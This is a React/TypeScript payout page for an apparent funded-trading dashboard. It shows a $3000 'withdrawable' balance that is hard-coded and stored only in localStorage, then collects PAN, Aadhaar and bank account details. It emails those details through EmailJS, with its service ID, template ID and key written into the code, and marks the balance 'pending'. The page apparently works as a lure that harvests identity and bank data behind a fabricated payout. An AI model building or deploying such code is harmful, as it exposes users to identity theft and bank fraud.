import { useState, useEffect } from "react";
import emailjs from "emailjs-com";

import dollarimg from "../assets/dollar-crypto.svg";
import KYCFormPopup from "../components/KYCFormPopup";
import BankDetailsPopup from "../components/BankDetailsPopup";
import PayoutTable from "../components/PayoutTable";
import PayoutNotes from "../components/PayoutNotes";
import PayoutCard from "../components/PayoutCard";
// import ResetPayoutButton from "../components/ResetPayoutButton";

const payoutMethods = ["Rise", "USDT", "USDC"];
type PayoutValues = {
  withdrawable: number;
  pending: number;
  disbursed: number;
};


const PayoutPage = () => {
  const [kycData, setKycData] = useState({ pan: "", aadhar: "" });
  const [bankData, setBankData] = useState({
    accountName: "",
    accountNumber: "",
    ifsc: "",
  });

// const defaultPayoutValues = {
//   withdrawable: 3000,
//   pending: 0,
//   disbursed: 0,
// };

  const [payoutValues, setPayoutValues] = useState<PayoutValues>(() => {
    const saved = localStorage.getItem("payoutValues");
    return saved
      ? JSON.parse(saved)
      : { withdrawable: 3000, pending: 0, disbursed: 0 };
  });

// const resetPayoutValues = () => {
//   setPayoutValues(defaultPayoutValues);
//   localStorage.setItem("payoutValues", JSON.stringify(defaultPayoutValues));
// };


  useEffect(() => {
    localStorage.setItem("payoutValues", JSON.stringify(payoutValues));
  }, [payoutValues]);

  const [showPopup, setShowPopup] = useState(false);
  const [showBankPopup, setShowBankPopup] = useState(false);

  const handleFinalSubmit = async () => {
    const templateParams = {
      pan: kycData.pan,
      aadhar: kycData.aadhar,
      account_name: bankData.accountName,
      account_number: bankData.accountNumber,
      ifsc: bankData.ifsc,
    };

    try {
      await emailjs.send(
        "service_jnc6cm9",
        "template_c8c8s8p",
        templateParams,
        "0A0BiX4CFaupEwjpa"
      );
      alert("Details sent to notification@fundednxt.com");

      setPayoutValues((prev) => ({
        ...prev,
        withdrawable: 0,
        pending: prev.pending + prev.withdrawable,
      }));
    } catch (error) {
      console.error(error);
      alert("Failed to send email.");
    }
  };

  return (
    <div className="w-full p-4 space-y-6">
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="bg-white border rounded-xl p-6 space-y-4 shadow-sm">
          <h2 className="text-lg font-semibold text-gray-800">Payout</h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-1 xl:grid-cols-3 bg-gray-200 gap-4">
            {[
              {
                label: "Withdrawable Profit",
                value: `$${payoutValues.withdrawable}`,
                icon: dollarimg,
                bg: "bg-indigo-50",
                border: "border",
                tooltip: `Total amount of payout funds currently available for you to withdraw: $${payoutValues.withdrawable}`,
                onClick: () =>
                  payoutValues.withdrawable > 0 && setShowPopup(true),
              },
              {
                label: "Pending Amount",
                value: `$${payoutValues.pending}`,
                icon: dollarimg,
                bg: "bg-violet-100",
                border: "border-2 border-violet-500",
                tooltip: `Total requested payout amount currently being processed: $${payoutValues.pending}`,
              },
              {
                label: "Disbursed Amount",
                value: `$${payoutValues.disbursed}`,
                icon: dollarimg,
                bg: "bg-indigo-50",
                border: "border",
                tooltip: `Total disbursed amount that has been successfully transferred to you: $${payoutValues.disbursed}`,
              },
            ].map((card, idx) => (
              <PayoutCard
                key={idx}
                {...card}
                onClick={card.onClick || (() => {})}
              />
            ))}
          </div>
        </div>

        <div className="space-y-4">
          <div className="bg-gradient-to-r from-indigo-800 to-violet-700 text-white rounded-xl p-6 space-y-2 shadow">
            <h2 className="text-xl font-semibold">Request Your Payouts</h2>
            <p className="text-sm">
              Minimum payout amount is <span className="font-bold">$20</span>
            </p>
            <p className="text-sm">
              Complete KYC verification to enable payouts.
            </p>
          </div>

          <div className="border rounded-xl p-6 bg-white shadow">
            <h3 className="text-lg font-semibold mb-2">Payout Methods</h3>
            <p className="text-sm text-gray-600 mb-3">
              Supported payout methods:
            </p>
            <div className="flex flex-wrap gap-3">
              {payoutMethods.map((method) => (
                <span
                  key={method}
                  className="bg-gray-100 rounded-full px-4 py-2 text-sm font-medium text-indigo-700 shadow-sm"
                >
                  {method}
                </span>
              ))}
            </div>
          </div>
        </div>
      </div>

      {showPopup && (
        <KYCFormPopup
          onClose={() => setShowPopup(false)}
          onNext={() => {
            setShowPopup(false);
            setShowBankPopup(true);
          }}
          onChange={setKycData}
        />
      )}

      {showBankPopup && (
        <BankDetailsPopup
          onClose={() => {
            setShowBankPopup(false);
            handleFinalSubmit();
          }}
          onChange={setBankData}
        />
      )}

      <PayoutNotes />
      <PayoutTable />
      {/* <ResetPayoutButton onReset={resetPayoutValues} /> */}
    </div>
  );
};

export default PayoutPage;
